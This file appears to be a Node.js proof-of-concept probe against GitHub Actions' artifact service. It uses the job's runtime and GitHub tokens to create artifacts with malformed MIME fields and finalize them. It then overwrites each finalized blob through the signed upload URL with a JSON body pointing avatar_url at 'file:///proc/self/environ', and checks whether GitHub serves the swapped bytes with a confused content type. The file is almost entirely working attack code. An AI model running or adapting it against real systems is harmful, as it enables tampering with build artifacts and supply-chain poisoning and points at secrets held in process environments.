import {createHash} from 'node:crypto';
import {internalArtifactTwirpClient} from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from './node_modules/@actions/artifact/lib/generated/index.js';
const runtimeToken=process.env.ACTIONS_RUNTIME_TOKEN,ghToken=process.env.GH_TOKEN;
if(!runtimeToken||!ghToken)throw new Error('runtime credentials unavailable');
const ids=getBackendIdsFromToken(),client=internalArtifactTwirpClient(),repo=process.env.GITHUB_REPOSITORY;
const endpoint=`${new URL(process.env.ACTIONS_RESULTS_URL).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
const weird='\u0085application/json',placeholder=Buffer.from('{"p":1}'),hash=createHash('sha256').update(placeholder).digest('hex');
const cases=[['omitted',{}],['null',{mime_type:null}],['empty-wrapper',{mime_type:{value:''}}],['empty-string',{mime_type:''}]];
async function run(label,extra){
 const name=`omit-mime-${process.env.GITHUB_RUN_ID}-${label}`;
 const response=await fetch(endpoint+'CreateArtifact',{method:'POST',headers:{authorization:`Bearer ${runtimeToken}`,'content-type':'application/json'},body:JSON.stringify({...ids,name,version:7,...extra})});
 const result=await response.json().catch(()=>({}));
 if(!response.ok||!result.ok)return {label,createStatus:response.status,error:result.msg||result.message||'create failed'};
 const uploadUrl=result.signed_upload_url||result.signedUploadUrl;
 const put=await fetch(uploadUrl,{method:'PUT',headers:{'content-type':'application/octet-stream','x-ms-version':'2025-01-05','x-ms-blob-type':'BlockBlob','x-ms-blob-content-type':weird},body:placeholder});
 if(!put.ok)return {label,createStatus:response.status,putStatus:put.status,error:put.headers.get('x-ms-error-code')||'put failed'};
 const finalized=await client.FinalizeArtifact({workflowRunBackendId:ids.workflowRunBackendId,workflowJobRunBackendId:ids.workflowJobRunBackendId,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${hash}`})});
 if(!finalized.ok)return {label,error:'finalize failed'};
 const id=String(finalized.artifactId),body=Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'}}));
 const reupload=await fetch(uploadUrl,{method:'PUT',headers:{'content-type':'application/octet-stream','x-ms-version':'2025-01-05','x-ms-blob-type':'BlockBlob','x-ms-blob-content-type':weird},body});
 if(!reupload.ok)return {label,id,putStatus:reupload.status,error:reupload.headers.get('x-ms-error-code')||'overwrite failed'};
 const rest=await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,{redirect:'manual',headers:{authorization:`Bearer ${ghToken}`,accept:'application/vnd.github+json','user-agent':'repo-cassette-omitted-mime-probe'}});
 const location=rest.headers.get('location');if(!location)return {label,id,status:rest.status,error:'no redirect'};
 const parsed=new URL(location),raw=await fetch(location),bytes=Buffer.from(await raw.arrayBuffer());
 return {label,id,status:rest.status,rsct:parsed.searchParams.get('rsct'),rawType:raw.headers.get('content-type'),exact:bytes.equals(body),bytes:bytes.length};
}
for(const [label,extra] of cases){try{console.log(JSON.stringify(await run(label,extra)))}catch(e){console.log(JSON.stringify({label,error:String(e?.message||e).slice(0,200)}))}}
